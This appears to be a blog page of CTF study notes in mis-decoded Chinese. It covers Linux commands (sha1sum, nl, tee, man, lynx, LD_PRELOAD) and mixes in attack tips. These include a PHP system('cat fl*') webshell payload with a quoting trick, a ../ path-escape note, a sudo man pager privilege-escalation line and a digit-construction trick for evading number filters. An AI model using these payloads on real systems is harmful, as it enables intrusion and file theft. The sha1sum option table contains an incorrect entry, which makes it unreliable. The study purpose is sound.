<h3 id="å¸¸ç”¨é€‰é¡¹"><a href="#å¸¸ç”¨é€‰é¡¹" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a><strong>å¸¸ç”¨é€‰é¡¹</strong></h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>-b</code></td>
<td><strong>ä»¥äºŒè¿›åˆ¶æ¨¡å¼è®¡ç®—å“ˆå¸Œ</strong></td>
<td><code>sha1sum -b file.txt</code></td>
</tr>
<tr>
<td><code>-c</code></td>
<td><strong>æ ¡éªŒæ–‡ä»¶æ˜¯å¦ä¸æä¾›çš„å“ˆå¸Œå€¼åŒ¹é…</strong></td>
<td><code>sha1sum -c file.sha1</code></td>
</tr>
<tr>
<td><code>--check</code></td>
<td><strong>ä¸ <code>-c</code> ç›¸åŒï¼Œæ ¡éªŒæ–‡ä»¶çš„å“ˆå¸Œå€¼</strong></td>
<td><code>sha1sum --check file.sha1</code></td>
</tr>
<tr>
<td><code>--quiet</code></td>
<td><strong>åœ¨æ ¡éªŒæ—¶ä¸è¾“å‡ºä»»ä½•ä¿¡æ¯ï¼Œåªæœ‰é”™è¯¯æ—¶æ˜¾ç¤º</strong></td>
<td><code>sha1sum --check --quiet file.sha1</code></td>
</tr>
<tr>
<td><code>-t</code></td>
<td><strong>æŒ‡å®šè¾“å‡ºå“ˆå¸Œå€¼çš„é•¿åº¦ï¼ˆé»˜è®¤æ˜¯ 40ï¼‰</strong></td>
<td><code>sha1sum -t 20 file.txt</code></td>
</tr>
<tr>
<td><code>-h</code></td>
<td><strong>æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯</strong></td>
<td></td>
</tr>
</tbody></table>
<h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p>nl å‘½ä»¤åœ¨Â <a href="http://codex.wordpress.org.cn/Linux">linux</a>Â ç³»ç»Ÿä¸­ç”¨æ¥è®¡ç®—æ–‡ä»¶ä¸­è¡Œå·ã€‚nlÂ å¯ä»¥å°†è¾“å‡ºçš„æ–‡ä»¶å†…å®¹è‡ªåŠ¨çš„åŠ ä¸Šè¡Œå·ï¼å…¶é»˜è®¤çš„ç»“æœä¸Â catÂ -nÂ æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼ŒÂ nlÂ å¯ä»¥å°†è¡Œå·åšæ¯”è¾ƒå¤šçš„æ˜¾ç¤ºè®¾è®¡ï¼ŒåŒ…æ‹¬ä½æ•°ä¸æ˜¯å¦è‡ªåŠ¨è¡¥é½Â 0Â ç­‰ç­‰çš„åŠŸèƒ½ã€‚</p>
<h3 id="å‘½ä»¤æ ¼å¼ï¼š"><a href="#å‘½ä»¤æ ¼å¼ï¼š" class="headerlink" title="å‘½ä»¤æ ¼å¼ï¼š"></a>å‘½ä»¤æ ¼å¼ï¼š</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="code"><pre><span class="line">nlÂ [é€‰é¡¹]...Â [æ–‡ä»¶]...</span><br></pre></td></tr></table></figure></div>
<h3 id="å‘½ä»¤å‚æ•°ï¼š"><a href="#å‘½ä»¤å‚æ•°ï¼š" class="headerlink" title="å‘½ä»¤å‚æ•°ï¼š"></a>å‘½ä»¤å‚æ•°ï¼š</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-bÂ Â ï¼šæŒ‡å®šè¡Œå·æŒ‡å®šçš„æ–¹å¼ï¼Œä¸»è¦æœ‰ä¸¤ç§ï¼š</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-bÂ aÂ ï¼šè¡¨ç¤ºä¸è®ºæ˜¯å¦ä¸ºç©ºè¡Œï¼Œä¹ŸåŒæ ·åˆ—å‡ºè¡Œå· (ç±»ä¼¼Â catÂ -n)ï¼›</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-bÂ tÂ ï¼šå¦‚æœæœ‰ç©ºè¡Œï¼Œç©ºçš„é‚£ä¸€è¡Œä¸è¦åˆ—å‡ºè¡Œå· (é»˜è®¤å€¼)ï¼›</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-nÂ Â ï¼šåˆ—å‡ºè¡Œå·è¡¨ç¤ºçš„æ–¹æ³•ï¼Œä¸»è¦æœ‰ä¸‰ç§ï¼š</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-nÂ lnÂ ï¼šè¡Œå·åœ¨è¤å¹•çš„æœ€å·¦æ–¹æ˜¾ç¤ºï¼›</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-nÂ rnÂ ï¼šè¡Œå·åœ¨è‡ªå·±æ ä½çš„æœ€å³æ–¹æ˜¾ç¤ºï¼Œä¸”ä¸åŠ Â 0Â ï¼›</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-nÂ rzÂ ï¼šè¡Œå·åœ¨è‡ªå·±æ ä½çš„æœ€å³æ–¹æ˜¾ç¤ºï¼Œä¸”åŠ Â 0Â ï¼›</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-wÂ Â ï¼šè¡Œå·æ ä½çš„å ç”¨çš„ä½æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-pÂ åœ¨é€»è¾‘å®šç•Œç¬¦å¤„ä¸é‡æ–°å¼€å§‹è®¡ç®—ã€‚</span></span><br></pre></td></tr></table></figure></div>
<h2 id="shellå¼•å·"><a href="#shellå¼•å·" class="headerlink" title="shellå¼•å·"></a>shellå¼•å·</h2><p>åœ¨ shell ä¸­ï¼Œ<code>&#39;&quot;&#39;&quot;&#39;</code>ï¼ˆå•å¼•å· + åŒå¼•å· + å•å¼•å· + åŒå¼•å· + å•å¼•å·ï¼‰æ˜¯ä¸€ä¸ªæŠ€å·§ï¼Œç”¨æ¥åœ¨å•å¼•å·åŒ…å›´çš„å­—ç¬¦ä¸²ä¸­æ’å…¥ä¸€ä¸ªå•å¼•å·ã€‚è¦ç†è§£ä½•æ—¶ä½¿ç”¨å®ƒï¼Œéœ€è¦æŒæ¡ shell çš„å¼•å·è§„åˆ™ï¼š</p>
<ol>
<li><p><strong>å•å¼•å· (<code>&#39;</code>)</strong></p>
<ul>
<li>å•å¼•å·å†…çš„æ‰€æœ‰å­—ç¬¦éƒ½è¢«è§†ä¸ºåŸæ ·ï¼Œä¸ä¼šè¿›è¡Œå˜é‡æ›¿æ¢æˆ–è½¬ä¹‰ã€‚</li>
<li>ä¸èƒ½åœ¨å•å¼•å·å†…ç›´æ¥æ’å…¥å•å¼•å·ï¼Œé™¤éæ‰“ç ´å•å¼•å·çš„èŒƒå›´ã€‚</li>
</ul>
</li>
<li><p><strong>åŒå¼•å· (<code>&quot;</code>)</strong></p>
<ul>
<li>å…è®¸å˜é‡æ›¿æ¢å’Œå‘½ä»¤æ›¿æ¢ï¼ˆ<code>$VAR</code>ã€<code>$(command)</code>ï¼‰ã€‚</li>
<li>ä½†ä¸ä¼šè§£æ <code>\</code>ï¼ˆé™¤éç”¨äºè½¬ä¹‰ <code>$</code>ã€<code>`</code> æˆ– <code>&quot;</code>ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<p>å¦‚æœéœ€è¦åœ¨ä¸€ä¸ªå•å¼•å·å­—ç¬¦ä¸²å†…æ’å…¥å•å¼•å·ï¼ˆä¾‹å¦‚ <code>system(&#39;cat fl*&#39;)</code>ï¼‰ï¼Œå°±å¿…é¡»åœ¨å•å¼•å·å¤–éƒ¨æ‰“ç ´å®ƒã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span> (<span class="string">&#x27;&quot;&#x27;</span><span class="string">&quot;&#x27;cat fl*&#x27;&quot;</span><span class="string">&#x27;&quot;&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br><span class="line"><span class="language-xml">ç­‰æ•ˆ</span></span><br><span class="line"><span class="language-xml">&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span> (<span class="string">&#x27; + &quot;&#x27;</span><span class="string">&quot; + &#x27;cat fl*&#x27; + &quot;</span><span class="string">&#x27;&quot; + &#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†è§£ï¼š"><a href="#åˆ†è§£ï¼š" class="headerlink" title="åˆ†è§£ï¼š"></a>åˆ†è§£ï¼š</h3><ul>
<li><strong>ç¬¬ä¸€éƒ¨åˆ†</strong> <code>&#39;&lt;?php system (&#39;</code> <strong>â†’ ä»¥å•å¼•å·å¼€å¤´</strong></li>
<li><strong>ç¬¬äºŒéƒ¨åˆ†</strong> <code>&#39;&quot;&#39;&quot;&#39;</code> <strong>â†’ æ’å…¥å•å¼•å·</strong><ul>
<li><code>&#39;&quot;&#39;</code> <strong>(ç»“æŸå•å¼•å· + å¼€å¯åŒå¼•å·)</strong> â†’ è¿›å…¥åŒå¼•å·æ¨¡å¼</li>
<li><code>&quot;&#39;&quot;</code> <strong>(åŒå¼•å·å†…è¾“å…¥å•å¼•å·)</strong> â†’ ç”±äºåŒå¼•å·å†…çš„å•å¼•å·æœ‰æ•ˆï¼Œå®ƒå¯ä»¥ä½œä¸º PHP ä»£ç çš„ä¸€éƒ¨åˆ†</li>
<li><code>&#39;&quot;&#39;</code> <strong>(å…³é—­åŒå¼•å· + é‡æ–°å¼€å¯å•å¼•å·)</strong> â†’ è¿”å›å•å¼•å·æ¨¡å¼</li>
</ul>
</li>
<li><strong>ç¬¬ä¸‰éƒ¨åˆ†</strong> <code>&#39;cat fl*&#39;</code> <strong>â†’ ç»§ç»­å•å¼•å·å­—ç¬¦ä¸²</strong></li>
<li><strong>ç¬¬å››éƒ¨åˆ†</strong> <code>&#39;&quot;&#39;&quot;&#39;</code> <strong>â†’ å†æ¬¡æ’å…¥å•å¼•å·</strong></li>
<li><strong>ç¬¬äº”éƒ¨åˆ†</strong> <code>&#39;);?&gt;&#39;</code> <strong>â†’ ç»“æŸå•å¼•å·å­—ç¬¦ä¸²</strong></li>
</ul>
<h2 id="ssh-authorized-keys-1"><a href="#ssh-authorized-keys-1" class="headerlink" title="~&#x2F;.ssh&#x2F;authorized_keys"></a>~&#x2F;.ssh&#x2F;authorized_keys</h2><p><code>~/.ssh/authorized_keys</code> æ˜¯ä¸€ä¸ª <strong>å…¬é’¥è®¤è¯</strong> æ–‡ä»¶ï¼Œå®ƒå­˜å‚¨çš„æ˜¯ <strong>å¯ä»¥ç”¨äºæ— å¯†ç  SSH ç™»å½•è¯¥è´¦æˆ·çš„å…¬é’¥</strong>ã€‚</p>
<h3 id="ä½œç”¨-1"><a href="#ä½œç”¨-1" class="headerlink" title="ä½œç”¨"></a><strong>ä½œç”¨</strong></h3><p>å½“ä½ å°è¯•é€šè¿‡ SSH ç™»å½•åˆ°ä¸€ä¸ªè´¦æˆ·æ—¶ï¼ˆæ¯”å¦‚ <code>ssh user@host</code>ï¼‰ï¼ŒSSH æœåŠ¡å™¨ä¼šæ£€æŸ¥ <code>~/.ssh/authorized_keys</code> æ–‡ä»¶ï¼Œå¦‚æœå…¶ä¸­åŒ…å«ä¸ä½ çš„ç§é’¥åŒ¹é…çš„å…¬é’¥ï¼Œå°±å…è®¸ä½ ç™»å½•ï¼Œè€Œ <strong>æ— éœ€è¾“å…¥å¯†ç </strong>ã€‚<br><code>~/.ssh/authorized_keys</code> <strong>æ”¯æŒåœ¨å…¬é’¥å‰é¢æŒ‡å®š <code>command=</code> é€‰é¡¹</strong>ï¼Œè¿™æ · <strong>æ¯æ¬¡æœ‰äººä½¿ç”¨è¯¥å…¬é’¥ç™»å½•æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤</strong>ï¼Œè€Œä¸ä¼šå¯åŠ¨æ™®é€šçš„ shellã€‚</p>
<h3 id="ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥-1"><a href="#ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥-1" class="headerlink" title="ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥"></a>ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">ssh-keygen -<span class="attribute">y</span> -f id_rsa &gt; authorized_keys</span><br></pre></td></tr></table></figure></div>
<p>ğŸ“Œ <strong>è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>-y</code>ï¼šä»ç§é’¥ä¸­æå–å…¬é’¥</li>
<li><code>-f id_rsa</code>ï¼šæŒ‡å®šç§é’¥æ–‡ä»¶</li>
<li><code>&gt; authorized_keys</code>ï¼šè¾“å‡ºå…¬é’¥åˆ°æ–‡ä»¶</li>
</ul>
<h2 id="é€ƒé€¸"><a href="#é€ƒé€¸" class="headerlink" title="/*é€ƒé€¸"></a><code>/*é€ƒé€¸</code></h2><p>ç”¨<code>/*</code>è¯´æ˜æ‰§è¡Œ<code>/</code>åé¢çš„æ‰€æœ‰å†…å®¹ï¼Œé‚£å¯ä»¥å†™<code>../../../</code>é€ƒé€¸åˆ°æœ‰å†™å…¥æƒé™çš„ç›®å½•ã€‚</p>
<h2 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h2><p><code>tee</code> æ˜¯ä¸€ä¸ªåœ¨ç±» Unix ç³»ç»Ÿä¸­å¸¸ç”¨çš„å‘½ä»¤ï¼Œå®ƒç”¨äºä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶åŒæ—¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºå’Œä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ä¸­ã€‚è¿™å¯¹äºåœ¨ä¸ä¸¢å¤±æ•°æ®çš„æƒ…å†µä¸‹åŒæ—¶æŸ¥çœ‹å’Œä¿å­˜è¾“å‡ºéå¸¸æœ‰ç”¨ã€‚</p>
<h3 id="å¸¸è§é€‰é¡¹ï¼š"><a href="#å¸¸è§é€‰é¡¹ï¼š" class="headerlink" title="å¸¸è§é€‰é¡¹ï¼š"></a>å¸¸è§é€‰é¡¹ï¼š</h3><ul>
<li><code>-a</code>ï¼šè¿½åŠ åˆ°æ–‡ä»¶ï¼Œè€Œä¸æ˜¯è¦†ç›–æ–‡ä»¶ã€‚</li>
<li><code>-i</code>ï¼šå¿½ç•¥ä¸­æ–­ä¿¡å·ã€‚</li>
<li><code>-p</code>ï¼šåœ¨æ–‡ä»¶å†™å…¥ä¹‹å‰æ˜¾ç¤ºè¾“å‡ºã€‚</li>
</ul>
<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p><code>man</code>ï¼ˆmanualï¼‰æ˜¯ Linux å’Œ Unix ç³»ç»Ÿä¸­çš„ <strong>æ‰‹å†Œï¼ˆManualï¼‰</strong> å‘½ä»¤ï¼Œä¸»è¦ç”¨äºæŸ¥çœ‹ <strong>å‘½ä»¤ã€åº“å‡½æ•°ã€é…ç½®æ–‡ä»¶ç­‰çš„æ–‡æ¡£</strong>ã€‚<br>å‡ ä¹æ‰€æœ‰ Linux å‘½ä»¤éƒ½æœ‰å¯¹åº”çš„ <code>man</code> æ‰‹å†Œï¼Œæ ¼å¼ <strong>æ ‡å‡†ã€ç»“æ„æ¸…æ™°</strong>ï¼Œæ˜¯å­¦ä¹  Linux çš„é‡è¦å‚è€ƒèµ„æ–™ã€‚<br><code>man</code> æ‰‹å†Œåˆ†ä¸º <strong>å¤šä¸ªç« èŠ‚</strong>ï¼Œä¸åŒç« èŠ‚çš„æ¡ç›®å¯èƒ½æœ‰ç›¸åŒçš„åç§°ï¼Œä½†å†…å®¹ä¸åŒï¼š</p>
<table>
<thead>
<tr>
<th><strong>ç« èŠ‚</strong></th>
<th><strong>å†…å®¹</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td>ç”¨æˆ·å‘½ä»¤ï¼ˆå¸¸è§å‘½ä»¤ï¼Œå¦‚ <code>ls</code>ã€<code>cd</code>ã€<code>grep</code>ï¼‰</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚ <code>open()</code>ã€<code>read()</code>ï¼Œéœ€è¦ <code>#include</code>ï¼‰</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>åº“å‡½æ•°ï¼ˆå¦‚ <code>printf()</code>ã€<code>malloc()</code>ï¼Œéœ€è¦ <code>#include</code>ï¼‰</td>
</tr>
<tr>
<td><strong>4</strong></td>
<td>è®¾å¤‡æ–‡ä»¶ï¼ˆå¦‚ <code>/dev/null</code>ï¼‰</td>
</tr>
<tr>
<td><strong>5</strong></td>
<td>é…ç½®æ–‡ä»¶æ ¼å¼ï¼ˆå¦‚ <code>/etc/passwd</code>ï¼‰</td>
</tr>
<tr>
<td><strong>6</strong></td>
<td>æ¸¸æˆå’Œå¨±ä¹</td>
</tr>
<tr>
<td><strong>7</strong></td>
<td>æ‚é¡¹ï¼ˆå¦‚ <code>man 7 regex</code> è§£é‡Šæ­£åˆ™è¡¨è¾¾å¼ï¼‰</td>
</tr>
<tr>
<td><strong>8</strong></td>
<td>ç®¡ç†å‘˜å‘½ä»¤ï¼ˆå¦‚ <code>iptables</code>ï¼Œéœ€è¦ root æƒé™ï¼‰</td>
</tr>
</tbody></table>
<h2 id="man-å‘½ä»¤çš„å¸¸ç”¨é€‰é¡¹"><a href="#man-å‘½ä»¤çš„å¸¸ç”¨é€‰é¡¹" class="headerlink" title="man å‘½ä»¤çš„å¸¸ç”¨é€‰é¡¹"></a><strong><code>man</code> å‘½ä»¤çš„å¸¸ç”¨é€‰é¡¹</strong></h2><table>
<thead>
<tr>
<th><strong>é€‰é¡¹</strong></th>
<th><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>-f</code></td>
<td>æŸ¥æ‰¾å‘½ä»¤å±äºå“ªä¸ª <code>man</code> ç« èŠ‚ï¼ˆç­‰åŒäº <code>whatis</code>ï¼‰</td>
</tr>
<tr>
<td><code>-k</code></td>
<td>å…³é”®å­—æœç´¢æ‰‹å†Œï¼ˆç­‰åŒäº <code>apropos</code>ï¼‰</td>
</tr>
<tr>
<td><code>-P &lt;pager&gt;</code></td>
<td>æŒ‡å®šåˆ†é¡µå™¨ï¼ˆé»˜è®¤ <code>less</code>ï¼‰</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰åŒ¹é…çš„æ‰‹å†Œ</td>
</tr>
<tr>
<td><code>-l &lt;file&gt;</code></td>
<td>è¯»å–æœ¬åœ° <code>man</code> æ‰‹å†Œ</td>
</tr>
<tr>
<td><code>-w</code></td>
<td>ä»…æ˜¾ç¤ºæ‰‹å†Œè·¯å¾„ï¼Œä¸æ‰“å¼€</td>
</tr>
<tr>
<td>åœ¨æœ‰çš„é¢˜ç›®ä¸­å¦‚æœç”¨manææƒæ— æ³•ç›´æ¥æ‰“å¼€ï¼Œè¦æŒ‡å®šåˆ†é¡µå™¨</td>
<td></td>
</tr>
</tbody></table>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŠ¥é”™ä¿¡æ¯</span></span><br><span class="line">Your terminal lacks <span class="keyword">the</span> ability <span class="built_in">to</span> <span class="built_in">clear</span> <span class="keyword">the</span> screen <span class="keyword">or</span> position <span class="keyword">the</span> cursor.</span><br><span class="line"></span><br><span class="line">sudo /bin/man -P /usr/bin/less man</span><br></pre></td></tr></table></figure></div>

<h2 id=""><a href="#" class="headerlink" title="$(())"></a>$(())</h2><p>è¿™æ˜¯shellä¸­çš„è®¡ç®—ç¬¦ï¼Œé‡Œé¢è·Ÿä¸Šè®¡ç®—å¼ , é‡Œé¢æ²¡æœ‰å€¼å°±æ˜¯0<br>~æ˜¯å–åï¼Œå€¼ç­‰äº+1å†ç›¸åï¼Œæ¯”å¦‚-37çš„åå°±æ˜¯36 , æœ‰çš„é¢˜ç›®è¿‡æ»¤äº†æ•°å­—ï¼Œä½†æ˜¯è¦æ‹¼å‡ºä¸€ä¸ªæ•°å­—å°±ç”¨è¿™ç§æ–¹æ³•<br>æ¯”å¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="code"><pre><span class="line">awk <span class="keyword">BEGIN</span>&#123;<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">36</span>;i++)&#123;a=a<span class="string">&quot;<span class="variable">$</span>((~<span class="variable">$</span>(())))&quot;</span>&#125;print <span class="string">&quot;<span class="variable">$</span>((~(&quot;</span>a<span class="string">&quot;)))&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>((~(<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(()))))))</span><br><span class="line"></span><br><span class="line"><span class="number">36</span></span><br></pre></td></tr></table></figure></div>

<h2 id="usr-lib"><a href="#usr-lib" class="headerlink" title="&#x2F;usr&#x2F;lib"></a>&#x2F;usr&#x2F;lib</h2><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ<code>/usr/lib</code> ç›®å½•é€šå¸¸ç”¨äºå­˜æ”¾ <strong>ç³»ç»Ÿå’Œç”¨æˆ·ç¨‹åºçš„åº“æ–‡ä»¶</strong>ï¼ˆshared librariesï¼‰</p>
<h3 id="1-å…±äº«åº“ï¼ˆShared-Librariesï¼‰"><a href="#1-å…±äº«åº“ï¼ˆShared-Librariesï¼‰" class="headerlink" title="1. å…±äº«åº“ï¼ˆShared Librariesï¼‰"></a><strong>1. å…±äº«åº“ï¼ˆShared Librariesï¼‰</strong></h3><ul>
<li>ä¾‹å¦‚ï¼š<code>libc.so</code>ï¼ˆC æ ‡å‡†åº“ï¼‰ã€<code>libssl.so</code>ï¼ˆOpenSSL åŠ å¯†åº“ï¼‰ç­‰</li>
</ul>
<h3 id="2-ä¾èµ–åº“ï¼ˆDependency-Librariesï¼‰"><a href="#2-ä¾èµ–åº“ï¼ˆDependency-Librariesï¼‰" class="headerlink" title="2. ä¾èµ–åº“ï¼ˆDependency Librariesï¼‰"></a><strong>2. ä¾èµ–åº“ï¼ˆDependency Librariesï¼‰</strong></h3><ul>
<li>å­˜æ”¾å„ç§è½¯ä»¶çš„ä¾èµ–åº“ï¼Œä¾‹å¦‚ Pythonã€Perlã€Node.jsã€Qtã€GTK ç›¸å…³çš„åº“</li>
<li>ä¾‹å¦‚ï¼š<ul>
<li><code>/usr/lib/python3.9/</code> â†’ Python 3.9 ç›¸å…³çš„åº“</li>
<li><code>/usr/lib/node_modules/</code> â†’ Node.js å…¨å±€å®‰è£…çš„æ¨¡å—</li>
</ul>
</li>
</ul>
<h3 id="3-æ’ä»¶ï¼ˆPluginsï¼‰"><a href="#3-æ’ä»¶ï¼ˆPluginsï¼‰" class="headerlink" title="3. æ’ä»¶ï¼ˆPluginsï¼‰"></a><strong>3. æ’ä»¶ï¼ˆPluginsï¼‰</strong></h3><ul>
<li>æŸäº›è½¯ä»¶çš„æ’ä»¶æˆ–æ¨¡å—ä¹Ÿä¼šæ”¾åœ¨ <code>/usr/lib</code></li>
<li>ä¾‹å¦‚ï¼š<ul>
<li><code>/usr/lib/firefox/</code> â†’ Firefox çš„æ’ä»¶</li>
<li><code>/usr/lib/vim/</code> â†’ Vim ç›¸å…³æ’ä»¶</li>
</ul>
</li>
</ul>
<h3 id="4-32-ä½ä¸-64-ä½åº“"><a href="#4-32-ä½ä¸-64-ä½åº“" class="headerlink" title="4. 32 ä½ä¸ 64 ä½åº“"></a><strong>4. 32 ä½ä¸ 64 ä½åº“</strong></h3><ul>
<li>åœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼š<ul>
<li><code>/usr/lib/</code> å¯èƒ½ç”¨äº 32 ä½åº“ï¼ˆæŸäº›ç³»ç»Ÿï¼‰</li>
<li><code>/usr/lib64/</code> å­˜æ”¾ 64 ä½åº“</li>
</ul>
</li>
</ul>
<p>æ‰€ä»¥æ‰¾pythonçš„ä¸€äº›åº“çš„å‡½æ•°å°±åˆ°&#x2F;usr&#x2F;lib&#x2F;pythonxä¸­æ‰¾</p>
<h2 id="lynx"><a href="#lynx" class="headerlink" title="lynx"></a>lynx</h2><p><code>lynx</code> æ˜¯ Linux ä¸‹çš„ä¸€æ¬¾åŸºäºç»ˆç«¯çš„æ–‡æœ¬æ¨¡å¼ Web æµè§ˆå™¨ï¼Œå®ƒå…è®¸ç”¨æˆ·åœ¨æ²¡æœ‰å›¾å½¢ç•Œé¢çš„ç¯å¢ƒä¸‹è®¿é—®ç½‘é¡µã€‚ç”±äº <code>lynx</code> åªæ˜¾ç¤ºçº¯æ–‡æœ¬ï¼Œå®ƒåœ¨æœåŠ¡å™¨ç¯å¢ƒã€è¿œç¨‹ç®¡ç†ï¼ˆå¦‚ SSHï¼‰ã€æ—  GUI çš„ç³»ç»Ÿä»¥åŠéœ€è¦å¿«é€Ÿè®¿é—®ç½‘é¡µæ—¶éå¸¸æœ‰ç”¨ã€‚<br>è€Œä¸”è¿˜æœ‰file:&#x2F;&#x2F; http:&#x2F;&#x2F; ftp:&#x2F;&#x2F; ç­‰åè®® å¯ä»¥æŸ¥çœ‹æœ¬åœ°æ–‡ä»¶</p>
<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºåœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åŠ è½½æŒ‡å®šçš„å…±äº«åº“ã€‚LD_PRELOAD çš„ä½œç”¨æ˜¯åœ¨ç¨‹åºè¿è¡Œå‰ï¼Œå°†æŒ‡å®šçš„å…±äº«åº“åŠ è½½åˆ°ç¨‹åºçš„å†…å­˜ä¸­ã€‚è¿™æ ·ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šä¼˜å…ˆä½¿ç”¨è¯¥å…±äº«åº“ä¸­çš„ç¬¦å·ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿé»˜è®¤çš„ç¬¦å·ã€‚LD_PRELOAD å¯ä»¥ç”¨äºæ›¿æ¢ç¨‹åºæœ¬èº«çš„å‡½æ•°ï¼Œå¢åŠ ç¨‹åºçš„åŠŸèƒ½æˆ–è€…è°ƒè¯•ç¨‹åºã€‚</p>
